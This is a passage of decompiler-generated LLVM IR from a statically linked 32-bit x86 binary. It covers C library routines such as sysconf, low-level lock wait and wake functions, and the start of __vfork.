  %v0_80625a1 = phi i32 [ %v0_80625a1.pre, %dec_label_pc_8062596.backedge ], [ %v2_8062553, %dec_label_pc_8062561 ]
  %tmp20 = inttoptr i32 %v0_80625a1 to i32*
  %v6_80625a2 = call i32 @__GI_config_read(i32* %tmp20, i32 %v2_8062563, i32 258, i32 ptrtoint (i32* @global_var_806fb4a.1641 to i32))
  %v1_80625aa = icmp eq i32 %v6_80625a2, 0
  %v1_80625ac = icmp eq i1 %v1_80625aa, false
  br i1 %v1_80625ac, label %dec_label_pc_8062569, label %dec_label_pc_8062601.loopexit2

dec_label_pc_80625b0:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  %v2_80625ba = call i32 @__GI_config_open(i32 ptrtoint ([14 x i8]* @global_var_806fb85.1642 to i32))
  %v2_80625c2 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_80625c2, i32* @edi, align 4
  %v1_80625c6 = icmp eq i32 %v2_80625ba, 0
  store i32 %v2_80625ba, i32* @esi, align 4
  %v1_80625ca = icmp eq i1 %v1_80625c6, false
  br i1 %v1_80625ca, label %dec_label_pc_80625e9.preheader, label %dec_label_pc_8062601

dec_label_pc_80625e9.preheader:                   ; preds = %dec_label_pc_80625b0
  br label %dec_label_pc_80625e9

dec_label_pc_80625ce:                             ; preds = %dec_label_pc_80625e9
  %v3_80625d0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_80625d0, i32* @eax, align 4
  %v1_80625d4 = inttoptr i32 %v3_80625d0 to i32*
  %v2_80625d4 = load i32, i32* %v1_80625d4, align 4
  %v4_80625db = call i32 @__GI_strcoll(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_806fb93.1643, i32 0, i32 0), i32 %v2_80625d4)
  %v5_80625e3 = icmp eq i32 %v4_80625db, 0
  %v0_80625e6 = load i32, i32* @ebx, align 4
  %v2_80625e6 = zext i1 %v5_80625e3 to i32
  %v3_80625e6 = add i32 %v0_80625e6, %v2_80625e6
  store i32 %v3_80625e6, i32* @ebx, align 4
  %v0_80625f4.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80625e9

dec_label_pc_80625e9:                             ; preds = %dec_label_pc_80625e9.preheader, %dec_label_pc_80625ce
  %v0_80625f4 = phi i32 [ %v2_80625ba, %dec_label_pc_80625e9.preheader ], [ %v0_80625f4.pre, %dec_label_pc_80625ce ]
  %tmp21 = inttoptr i32 %v0_80625f4 to i32*
  %v6_80625f5 = call i32 @__GI_config_read(i32* %tmp21, i32 %v2_80625c2, i32 459266, i32 ptrtoint (i32* @global_var_806fbb8.1644 to i32))
  %v1_80625fd = icmp eq i32 %v6_80625f5, 0
  %v1_80625ff = icmp eq i1 %v1_80625fd, false
  br i1 %v1_80625ff, label %dec_label_pc_80625ce, label %dec_label_pc_8062601

dec_label_pc_8062601.loopexit2:                   ; preds = %dec_label_pc_8062596
  br label %dec_label_pc_8062601

dec_label_pc_8062601:                             ; preds = %dec_label_pc_80625e9, %dec_label_pc_8062601.loopexit2, %dec_label_pc_80625b0
  %v0_8062604 = load i32, i32* @esi, align 4
  %tmp22 = inttoptr i32 %v0_8062604 to i32*
  %v3_8062605 = call i32 @__GI_config_close(i32* %tmp22)
  %v0_806260a = load i32, i32* @ebx, align 4
  %v1_806260a = icmp eq i32 %v0_806260a, 0
  %v3_8062611 = select i1 %v1_806260a, i32 1, i32 %v0_806260a
  ret i32 %v3_8062611

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 0, 3, 1, 4, 2 }
  uselistorder label %dec_label_pc_8062601, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80625e9, { 1, 0 }
  uselistorder label %dec_label_pc_8062596.backedge, { 0, 3, 2, 1 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i8*, align 4
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_806261d = load i32, i32* @esi, align 4
  %v0_806261e = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  switch i32 %arg1, label %dec_label_pc_806263e [
    i32 0, label %dec_label_pc_8062652
    i32 1, label %dec_label_pc_806264a
    i32 2, label %dec_label_pc_8062689
    i32 3, label %dec_label_pc_8062693
    i32 4, label %dec_label_pc_806269d
    i32 5, label %dec_label_pc_80627e2
    i32 6, label %dec_label_pc_80626a7
    i32 7, label %dec_label_pc_8062634
    i32 8, label %dec_label_pc_8062634
    i32 9, label %dec_label_pc_8062634
    i32 10, label %dec_label_pc_8062634
    i32 11, label %dec_label_pc_8062634
    i32 12, label %dec_label_pc_8062634
    i32 13, label %dec_label_pc_8062634
    i32 14, label %dec_label_pc_8062634
    i32 15, label %dec_label_pc_8062634
    i32 16, label %dec_label_pc_8062634
    i32 17, label %dec_label_pc_8062634
    i32 18, label %dec_label_pc_8062634
    i32 19, label %dec_label_pc_8062634
    i32 20, label %dec_label_pc_8062634
    i32 21, label %dec_label_pc_8062634
    i32 22, label %dec_label_pc_8062634
    i32 23, label %dec_label_pc_806264a
    i32 24, label %dec_label_pc_806264a
    i32 25, label %dec_label_pc_806281a
    i32 26, label %dec_label_pc_8062813
    i32 27, label %dec_label_pc_806264a
    i32 28, label %dec_label_pc_80626bb
    i32 29, label %dec_label_pc_80627f0
    i32 30, label %dec_label_pc_80626b1
    i32 31, label %dec_label_pc_80627fe
    i32 32, label %dec_label_pc_806264a
    i32 33, label %dec_label_pc_8062813
    i32 34, label %dec_label_pc_806264a
    i32 35, label %dec_label_pc_806264a
    i32 36, label %dec_label_pc_8062821
    i32 37, label %dec_label_pc_8062828
    i32 38, label %dec_label_pc_8062821
    i32 39, label %dec_label_pc_80626c5
    i32 40, label %dec_label_pc_80627e9
    i32 41, label %dec_label_pc_806264a
    i32 42, label %dec_label_pc_80627fe
    i32 43, label %dec_label_pc_8062828
    i32 44, label %dec_label_pc_806282f
    i32 45, label %dec_label_pc_8062828
    i32 46, label %dec_label_pc_80627f0
    i32 47, label %dec_label_pc_80627f0
    i32 48, label %dec_label_pc_80627f0
    i32 49, label %dec_label_pc_806264a
    i32 50, label %dec_label_pc_806264a
    i32 51, label %dec_label_pc_80627f0
    i32 52, label %dec_label_pc_806264a
    i32 53, label %dec_label_pc_806264a
    i32 54, label %dec_label_pc_806264a
    i32 55, label %dec_label_pc_806264a
    i32 56, label %dec_label_pc_806264a
    i32 57, label %dec_label_pc_806264a
    i32 58, label %dec_label_pc_806264a
    i32 59, label %dec_label_pc_806264a
    i32 60, label %dec_label_pc_806280c
    i32 61, label %dec_label_pc_806264a
    i32 62, label %dec_label_pc_806264a
    i32 63, label %dec_label_pc_806264a
    i32 64, label %dec_label_pc_806264a
    i32 65, label %dec_label_pc_806264a
    i32 66, label %dec_label_pc_806264a
    i32 67, label %dec_label_pc_8062634
    i32 68, label %dec_label_pc_8062634
    i32 69, label %dec_label_pc_80627f7
    i32 70, label %dec_label_pc_80627f7
    i32 71, label %dec_label_pc_80627f7
    i32 72, label %dec_label_pc_80627fe
    i32 73, label %dec_label_pc_8062805
    i32 74, label %dec_label_pc_806280c
    i32 75, label %dec_label_pc_80626d9
    i32 76, label %dec_label_pc_806264a
    i32 77, label %dec_label_pc_8062634
    i32 78, label %dec_label_pc_8062634
    i32 79, label %dec_label_pc_8062634
    i32 80, label %dec_label_pc_8062634
    i32 81, label %dec_label_pc_8062634
    i32 82, label %dec_label_pc_8062634
    i32 83, label %dec_label_pc_80626e3
    i32 84, label %dec_label_pc_8062757
    i32 85, label %dec_label_pc_806264a
    i32 86, label %dec_label_pc_806264a
    i32 87, label %dec_label_pc_8062813
    i32 88, label %dec_label_pc_8062763
    i32 89, label %dec_label_pc_806276d
    i32 90, label %dec_label_pc_8062805
    i32 91, label %dec_label_pc_8062634
    i32 92, label %dec_label_pc_8062634
    i32 93, label %dec_label_pc_8062634
    i32 94, label %dec_label_pc_8062634
    i32 95, label %dec_label_pc_80626cf
    i32 96, label %dec_label_pc_806264a
    i32 97, label %dec_label_pc_806264a
    i32 98, label %dec_label_pc_8062634
    i32 99, label %dec_label_pc_8062634
    i32 100, label %dec_label_pc_8062634
    i32 101, label %dec_label_pc_8062777
    i32 102, label %dec_label_pc_80627e9
    i32 103, label %dec_label_pc_8062781
    i32 104, label %dec_label_pc_8062813
    i32 105, label %dec_label_pc_8062788
    i32 106, label %dec_label_pc_80627fe
    i32 107, label %dec_label_pc_80627fe
    i32 108, label %dec_label_pc_80627e2
    i32 109, label %dec_label_pc_806281a
    i32 110, label %dec_label_pc_806282f
    i32 111, label %dec_label_pc_8062792
    i32 112, label %dec_label_pc_806279c
    i32 113, label %dec_label_pc_806282f
    i32 114, label %dec_label_pc_80627a6
    i32 115, label %dec_label_pc_80627e9
    i32 116, label %dec_label_pc_806264a
    i32 117, label %dec_label_pc_806264a
    i32 118, label %dec_label_pc_80627b0
    i32 119, label %dec_label_pc_80627b7
    i32 120, label %dec_label_pc_8062828
    i32 121, label %dec_label_pc_8062813
    i32 122, label %dec_label_pc_8062813
    i32 123, label %dec_label_pc_8062813
    i32 124, label %dec_label_pc_8062813
    i32 125, label %dec_label_pc_8062634
    i32 126, label %dec_label_pc_8062634
    i32 127, label %dec_label_pc_806264a
    i32 128, label %dec_label_pc_806264a
    i32 129, label %dec_label_pc_8062634
    i32 130, label %dec_label_pc_8062634
    i32 131, label %dec_label_pc_8062634
    i32 139, label %dec_label_pc_806264a
    i32 149, label %dec_label_pc_80627be
    i32 237, label %dec_label_pc_8062634
    i32 238, label %dec_label_pc_8062634
    i32 239, label %dec_label_pc_806264a
    i32 240, label %dec_label_pc_806264a
  ]

dec_label_pc_8062634:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8062834

dec_label_pc_806263e:                             ; preds = %entry
  store i32 22, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_806264a

dec_label_pc_806264a:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_806263e
  br label %dec_label_pc_8062834

dec_label_pc_8062652:                             ; preds = %entry
  %v2_8062654 = ptrtoint i32* %stack_var_-16 to i32
  store i8* inttoptr (i32 3 to i8*), i8** %stack_var_-44, align 4
  %v3_806265b = call i32 @getrlimit(i32 3, i32 %v2_8062654)
  %v1_8062668 = icmp eq i32 %v3_806265b, 0
  %v1_806266a = icmp eq i1 %v1_8062668, false
  br i1 %v1_806266a, label %dec_label_pc_8062834, label %dec_label_pc_8062670

dec_label_pc_8062670:                             ; preds = %dec_label_pc_8062652
  %v3_8062670 = load i32, i32* %stack_var_-16, align 4
  %tmp = icmp ult i32 %v3_8062670, 524288
  br i1 %tmp, label %dec_label_pc_8062834, label %dec_label_pc_806267f

dec_label_pc_806267f:                             ; preds = %dec_label_pc_8062670
  %v2_8062681 = udiv i32 %v3_8062670, 4
  br label %dec_label_pc_8062834

dec_label_pc_8062689:                             ; preds = %entry
  br label %dec_label_pc_8062834

dec_label_pc_8062693:                             ; preds = %entry
  br label %dec_label_pc_8062834

dec_label_pc_806269d:                             ; preds = %entry
  %v2_806269d = call i32 @getdtablesize(i32 %v0_806261e, i32 %v0_806261d)
  br label %dec_label_pc_806275c

dec_label_pc_80626a7:                             ; preds = %entry
  br label %dec_label_pc_8062834

dec_label_pc_80626b1:                             ; preds = %entry
  %v2_80626b1 = call i32 @__GI_getpagesize(i32 %v0_806261e, i32 %v0_806261d)
  br label %dec_label_pc_806275c

dec_label_pc_80626bb:                             ; preds = %entry
  br label %dec_label_pc_8062834

dec_label_pc_80626c5:                             ; preds = %entry
  br label %dec_label_pc_8062834

dec_label_pc_80626cf:                             ; preds = %entry
  br label %dec_label_pc_8062834

dec_label_pc_80626d9:                             ; preds = %entry
  br label %dec_label_pc_8062834

dec_label_pc_80626e3:                             ; preds = %entry
  store i32 0, i32* @esi, align 4
  store i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_806fb9d.1646, i32 0, i32 0), i8** %stack_var_-44, align 4
  %v3_80626ed = call i32 @__GI_opendir(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_806fb9d.1646, i32 0, i32 0))
  store i32 %v3_80626ed, i32* @eax, align 4
  %v1_80626f5 = icmp eq i32 %v3_80626ed, 0
  store i32 %v3_80626ed, i32* @ebx, align 4
  %v1_80626f9 = icmp eq i1 %v1_80626f5, false
  br i1 %v1_80626f9, label %dec_label_pc_8062723.preheader, label %dec_label_pc_8062741

dec_label_pc_8062723.preheader:                   ; preds = %dec_label_pc_80626e3
  %v5_806272620 = inttoptr i32 %v3_80626ed to i8*
  store i8* %v5_806272620, i8** %stack_var_-44, align 4
  %tmp1721 = inttoptr i32 %v3_80626ed to i32*
  %v3_806272722 = call i32 @readdir64(i32* %tmp1721)
  %v1_806272f23 = icmp eq i32 %v3_806272722, 0
  %v1_806273125 = icmp eq i1 %v1_806272f23, false
  br i1 %v1_806273125, label %dec_label_pc_80626fd, label %dec_label_pc_8062733

dec_label_pc_80626fd:                             ; preds = %dec_label_pc_8062723.preheader, %dec_label_pc_8062723.backedge
  %v3_806272726 = phi i32 [ %v3_8062727, %dec_label_pc_8062723.backedge ], [ %v3_806272722, %dec_label_pc_8062723.preheader ]
  %v1_80626fd = add i32 %v3_806272726, 18
  %v2_80626fd = inttoptr i32 %v1_80626fd to i16*
  %v3_80626fd = load i16, i16* %v2_80626fd, align 2
  %v12_80626fd = icmp eq i16 %v3_80626fd, 25348
  %v1_8062703 = icmp eq i1 %v12_80626fd, false
  br i1 %v1_8062703, label %dec_label_pc_8062723.backedge, label %dec_label_pc_8062705

dec_label_pc_8062705:                             ; preds = %dec_label_pc_80626fd
  %v1_8062705 = add i32 %v3_806272726, 20
  %v2_8062705 = inttoptr i32 %v1_8062705 to i16*
  %v3_8062705 = load i16, i16* %v2_8062705, align 2
  %v9_8062705 = icmp eq i16 %v3_8062705, 30064
  %v1_806270b = icmp eq i1 %v9_8062705, false
  br i1 %v1_806270b, label %dec_label_pc_8062723.backedge, label %dec_label_pc_806270d

dec_label_pc_806270d:                             ; preds = %dec_label_pc_8062705
  %v1_806270d = add i32 %v3_806272726, 22
  %v2_806270d = inttoptr i32 %v1_806270d to i8*
  %v3_806270d = load i8, i8* %v2_806270d, align 1
  %v4_806270d = zext i8 %v3_806270d to i32
  %v0_8062711 = load i32, i32* @global_var_8071900, align 256
  %v2_8062716 = mul nuw nsw i32 %v4_806270d, 2
  %v3_8062716 = add i32 %v2_8062716, %v0_8062711
  %v4_8062716 = inttoptr i32 %v3_8062716 to i16*
  %v5_8062716 = load i16, i16* %v4_8062716, align 2
  %v1_806271a = and i16 %v5_8062716, 8
  %v2_806271a = icmp eq i16 %v1_806271a, 0
  %v0_8062720 = load i32, i32* @esi, align 4
  %v2_8062720 = zext i1 %v2_806271a to i32
  %v3_8062720 = add i32 %v0_8062720, 1
  %v4_8062720 = add i32 %v2_8062720, %v3_8062720
  store i32 %v4_8062720, i32* @esi, align 4
  br label %dec_label_pc_8062723.backedge

dec_label_pc_8062723.backedge:                    ; preds = %dec_label_pc_806270d, %dec_label_pc_80626fd, %dec_label_pc_8062705
  %v0_8062726.pre = load i32, i32* @ebx, align 4
  %v5_8062726 = inttoptr i32 %v0_8062726.pre to i8*
  store i8* %v5_8062726, i8** %stack_var_-44, align 4
  %tmp17 = inttoptr i32 %v0_8062726.pre to i32*
  %v3_8062727 = call i32 @readdir64(i32* %tmp17)
  %v1_806272f = icmp eq i32 %v3_8062727, 0
  %v1_8062731 = icmp eq i1 %v1_806272f, false
  br i1 %v1_8062731, label %dec_label_pc_80626fd, label %dec_label_pc_8062733

dec_label_pc_8062733:                             ; preds = %dec_label_pc_8062723.backedge, %dec_label_pc_8062723.preheader
  %v0_8062736 = load i32, i32* @ebx, align 4
  %v5_8062736 = inttoptr i32 %v0_8062736 to i8*
  store i8* %v5_8062736, i8** %stack_var_-44, align 4
  %tmp18 = inttoptr i32 %v0_8062736 to i32*
  %v3_8062737 = call i32 @__GI_closedir(i32* %tmp18)
  %v0_806274d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8062748

dec_label_pc_8062741:                             ; preds = %dec_label_pc_80626e3
  %v0_8062741 = load i8*, i8** %stack_var_-44, align 4
  %v1_8062741 = ptrtoint i8* %v0_8062741 to i32
  %v3_8062741 = call i32 @nprocessors_onln(i32 %v1_8062741, i32 %tmp10)
  br label %dec_label_pc_8062748

dec_label_pc_8062748:                             ; preds = %dec_label_pc_8062733, %dec_label_pc_8062741
  %v3_806274f = phi i32 [ %v0_806274d.pre, %dec_label_pc_8062733 ], [ %v3_8062741, %dec_label_pc_8062741 ]
  %v1_806274d = icmp eq i32 %v3_806274f, 0
  %v1_806274f = icmp eq i1 %v1_806274d, false
  %v4_806274f = select i1 %v1_806274f, i32 %v3_806274f, i32 1
  br label %dec_label_pc_8062834

dec_label_pc_8062757:                             ; preds = %entry
  %v2_8062757 = call i32 @nprocessors_onln(i32 %v0_806261e, i32 %v0_806261d)
  br label %dec_label_pc_806275c

dec_label_pc_806275c:                             ; preds = %dec_label_pc_80626b1, %dec_label_pc_806269d, %dec_label_pc_8062757
  %v0_806275c = phi i32 [ %v2_80626b1, %dec_label_pc_80626b1 ], [ %v2_806269d, %dec_label_pc_806269d ], [ %v2_8062757, %dec_label_pc_8062757 ]
  br label %dec_label_pc_8062834

dec_label_pc_8062763:                             ; preds = %entry
  br label %dec_label_pc_8062834

dec_label_pc_806276d:                             ; preds = %entry
  br label %dec_label_pc_8062834

dec_label_pc_8062777:                             ; preds = %entry
  br label %dec_label_pc_8062834

dec_label_pc_8062781:                             ; preds = %entry
  br label %dec_label_pc_8062834

dec_label_pc_8062788:                             ; preds = %entry
  br label %dec_label_pc_8062834

dec_label_pc_8062792:                             ; preds = %entry
  br label %dec_label_pc_8062834

dec_label_pc_806279c:                             ; preds = %entry
  br label %dec_label_pc_8062834

dec_label_pc_80627a6:                             ; preds = %entry
  br label %dec_label_pc_8062834

dec_label_pc_80627b0:                             ; preds = %entry
  br label %dec_label_pc_8062834

dec_label_pc_80627b7:                             ; preds = %entry
  br label %dec_label_pc_8062834

dec_label_pc_80627be:                             ; preds = %entry
  %v2_80627c3 = ptrtoint i32* %stack_var_-24 to i32
  %tmp19 = bitcast i32* %stack_var_-24 to %timespec*
  store i32 %v2_80627c3, i32* @ecx, align 4
  %v4_80627ce = call i32 @clock_getres(i32 1, %timespec* %tmp19)
  %not.v1_80627d7 = icmp ugt i32 %v4_80627ce, -4096
  %v1_80627df = sext i1 %not.v1_80627d7 to i32
  br label %dec_label_pc_8062834

dec_label_pc_80627e2:                             ; preds = %entry, %entry
  br label %dec_label_pc_8062834

dec_label_pc_80627e9:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_8062834

dec_label_pc_80627f0:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8062834

dec_label_pc_80627f7:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_8062834

dec_label_pc_80627fe:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8062834

dec_label_pc_8062805:                             ; preds = %entry, %entry
  br label %dec_label_pc_8062834

dec_label_pc_806280c:                             ; preds = %entry, %entry
  br label %dec_label_pc_8062834

dec_label_pc_8062813:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8062834

dec_label_pc_806281a:                             ; preds = %entry, %entry
  br label %dec_label_pc_8062834

dec_label_pc_8062821:                             ; preds = %entry, %entry
  br label %dec_label_pc_8062834

dec_label_pc_8062828:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8062834

dec_label_pc_806282f:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_8062834

dec_label_pc_8062834:                             ; preds = %dec_label_pc_8062670, %dec_label_pc_8062652, %dec_label_pc_8062828, %dec_label_pc_8062821, %dec_label_pc_806281a, %dec_label_pc_8062813, %dec_label_pc_806280c, %dec_label_pc_8062805, %dec_label_pc_80627fe, %dec_label_pc_80627f7, %dec_label_pc_80627f0, %dec_label_pc_80627e9, %dec_label_pc_80627e2, %dec_label_pc_80627be, %dec_label_pc_80627b7, %dec_label_pc_80627b0, %dec_label_pc_80627a6, %dec_label_pc_806279c, %dec_label_pc_8062792, %dec_label_pc_8062788, %dec_label_pc_8062781, %dec_label_pc_8062777, %dec_label_pc_806276d, %dec_label_pc_8062763, %dec_label_pc_8062748, %dec_label_pc_80626d9, %dec_label_pc_80626cf, %dec_label_pc_80626c5, %dec_label_pc_80626bb, %dec_label_pc_80626a7, %dec_label_pc_806275c, %dec_label_pc_8062693, %dec_label_pc_8062689, %dec_label_pc_806267f, %dec_label_pc_8062634, %dec_label_pc_806264a, %dec_label_pc_806282f
  %v0_8062837 = phi i32 [ 131072, %dec_label_pc_8062670 ], [ 131072, %dec_label_pc_8062652 ], [ 2048, %dec_label_pc_8062828 ], [ 99, %dec_label_pc_8062821 ], [ 20, %dec_label_pc_806281a ], [ 2147483647, %dec_label_pc_8062813 ], [ 1024, %dec_label_pc_806280c ], [ 4, %dec_label_pc_8062805 ], [ 32, %dec_label_pc_80627fe ], [ 256, %dec_label_pc_80627f7 ], [ 200112, %dec_label_pc_80627f0 ], [ 255, %dec_label_pc_80627e9 ], [ 16, %dec_label_pc_80627e2 ], [ %v1_80627df, %dec_label_pc_80627be ], [ 9, %dec_label_pc_80627b7 ], [ 65535, %dec_label_pc_80627b0 ], [ -32768, %dec_label_pc_80627a6 ], [ -128, %dec_label_pc_806279c ], [ 127, %dec_label_pc_8062792 ], [ -2147483648, %dec_label_pc_8062788 ], [ 0, %dec_label_pc_8062781 ], [ 8, %dec_label_pc_8062777 ], [ 500, %dec_label_pc_806276d ], [ 4096, %dec_label_pc_8062763 ], [ %v4_806274f, %dec_label_pc_8062748 ], [ 16384, %dec_label_pc_80626d9 ], [ 200809, %dec_label_pc_80626cf ], [ 1000, %dec_label_pc_80626c5 ], [ 32768, %dec_label_pc_80626bb ], [ 6, %dec_label_pc_80626a7 ], [ %v0_806275c, %dec_label_pc_806275c ], [ 65536, %dec_label_pc_8062693 ], [ 100, %dec_label_pc_8062689 ], [ %v2_8062681, %dec_label_pc_806267f ], [ 1, %dec_label_pc_8062634 ], [ -1, %dec_label_pc_806264a ], [ 32767, %dec_label_pc_806282f ]
  ret i32 %v0_8062837

; uselistorder directives
  uselistorder i32 %v3_8062727, { 1, 0 }
  uselistorder i32 %v3_8062670, { 1, 0 }
  uselistorder i32 %v0_806261e, { 2, 1, 0 }
  uselistorder i32 %v0_806261d, { 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 5, 4, 3, 0, 2, 1 }
  uselistorder i32 (i32, i32)* @nprocessors_onln, { 1, 0 }
  uselistorder i32 (i32*)* @readdir64, { 1, 0 }
  uselistorder i32 (i32, i32)* @getdtablesize, { 1, 0 }
  uselistorder i32 (i32, i32)* @getrlimit, { 1, 0 }
  uselistorder i32 124, { 1, 0 }
  uselistorder i32 115, { 3, 0, 1, 2 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 113, { 1, 0 }
  uselistorder i32 111, { 1, 0 }
  uselistorder i32 110, { 1, 0 }
  uselistorder i32 109, { 1, 0 }
  uselistorder i32 107, { 1, 0 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 105, { 1, 0 }
  uselistorder i32 103, { 1, 0 }
  uselistorder i32 99, { 1, 2, 0 }
  uselistorder i32 98, { 1, 0 }
  uselistorder i32 95, { 4, 2, 1, 3, 0 }
  uselistorder i32 94, { 1, 0 }
  uselistorder i32 93, { 1, 0 }
  uselistorder i32 91, { 1, 0 }
  uselistorder i32 90, { 1, 0 }
  uselistorder i32 89, { 1, 0 }
  uselistorder i32 87, { 1, 2, 0 }
  uselistorder i32 86, { 1, 0 }
  uselistorder i32 85, { 1, 0 }
  uselistorder i32 83, { 1, 0 }
  uselistorder i32 82, { 1, 0 }
  uselistorder i32 79, { 1, 0 }
  uselistorder i32 78, { 1, 0 }
  uselistorder i32 77, { 1, 0 }
  uselistorder i32 74, { 1, 0 }
  uselistorder i32 73, { 1, 0 }
  uselistorder i32 71, { 1, 0 }
  uselistorder i32 70, { 2, 3, 1, 0 }
  uselistorder i32 67, { 1, 0 }
  uselistorder i32 66, { 1, 0 }
  uselistorder i32 65, { 3, 0, 1, 4, 2 }
  uselistorder i32 63, { 1, 2, 0 }
  uselistorder i32 61, { 1, 0 }
  uselistorder i32 57, { 1, 0 }
  uselistorder i32 55, { 1, 2, 0 }
  uselistorder i32 54, { 1, 0 }
  uselistorder i32 53, { 1, 0 }
  uselistorder i32 51, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 50, { 3, 2, 0, 1 }
  uselistorder i32 49, { 2, 1, 0 }
  uselistorder i32 38, { 2, 3, 1, 0 }
  uselistorder i32 35, { 1, 0 }
  uselistorder i32 29, { 1, 0 }
  uselistorder i32 27, { 1, 0 }
  uselistorder i32 26, { 2, 1, 0 }
  uselistorder i32 25, { 1, 0 }
  uselistorder i32 23, { 2, 1, 3, 0 }
  uselistorder i32 21, { 1, 2, 0 }
  uselistorder i32 13, { 3, 5, 4, 6, 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8062834, { 36, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 30, 24, 25, 26, 27, 28, 29, 31, 32, 33, 0, 1, 35, 34 }
  uselistorder label %dec_label_pc_806275c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062748, { 1, 0 }
  uselistorder label %dec_label_pc_8062723.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80626fd, { 1, 0 }
  uselistorder label %dec_label_pc_806264a, { 36, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35 }
}

define i32 @__lll_lock_wait_private() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8062842 = load i32, i32* @esi, align 4
  store i32 %v0_8062842, i32* %stack_var_-12, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  %v0_8062848 = load i32, i32* @ecx, align 4
  store i32 %v0_8062848, i32* %ebx.global-to-local, align 4
  store i32 128, i32* @ecx, align 4
  %v0_8062851 = load i32, i32* @eax, align 4
  %v12_8062851 = icmp eq i32 %v0_8062851, 2
  %v1_8062853 = icmp eq i1 %v12_8062851, false
  br i1 %v1_8062853, label %dec_label_pc_806285c, label %dec_label_pc_8062855

dec_label_pc_8062855:                             ; preds = %dec_label_pc_806285c, %entry
  %v1_806285a = call i32 @int80_syscall(i32 240)
  %v0_806285c.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_806285e.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_806285c

dec_label_pc_806285c:                             ; preds = %dec_label_pc_8062855, %entry
  %v0_806285e = phi i32 [ %v0_806285e.pre, %dec_label_pc_8062855 ], [ %v0_8062848, %entry ]
  %v0_806285c = phi i32 [ %v0_806285c.pre, %dec_label_pc_8062855 ], [ 2, %entry ]
  %v1_806285e = inttoptr i32 %v0_806285e to i32*
  %v2_806285e = load i32, i32* %v1_806285e, align 4
  store i32 %v0_806285c, i32* %v1_806285e, align 4
  %v1_8062860 = icmp eq i32 %v2_806285e, 0
  %v1_8062862 = icmp eq i1 %v1_8062860, false
  br i1 %v1_8062862, label %dec_label_pc_8062855, label %dec_label_pc_8062864

dec_label_pc_8062864:                             ; preds = %dec_label_pc_806285c
  %v2_8062864 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8062864, i32* @esi, align 4
  ret i32 %v2_806285e
}

define i32 @__lll_unlock_wake_private() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8062872 = load i32, i32* @edx, align 4
  store i32 %v0_8062872, i32* %stack_var_-12, align 4
  %v0_8062873 = load i32, i32* @eax, align 4
  %v1_8062875 = inttoptr i32 %v0_8062873 to i32*
  store i32 0, i32* %v1_8062875, align 4
  %v1_806288a = call i32 @int80_syscall(i32 240)
  %v2_806288c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_806288c, i32* @edx, align 4
  ret i32 %v1_806288a
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_8062891 = load i32, i32* inttoptr (i32 108 to i32*), align 4
  store i32 %v0_8062891, i32* %edx.global-to-local, align 4
  %v1_806289a = sub i32 0, %v0_8062891
  %v6_806289a = icmp eq i32 %v0_8062891, 0
  %v1_806289c = icmp eq i1 %v6_806289a, false
  %v1_806289a. = select i1 %v1_806289c, i32 %v1_806289a, i32 -2147483648
  store i32 %v1_806289a., i32* inttoptr (i32 108 to i32*), align 4
  %v0_80628ae = call i32 @vfork()
  %v1_80628b1 = icmp eq i32 %v0_80628ae, 0
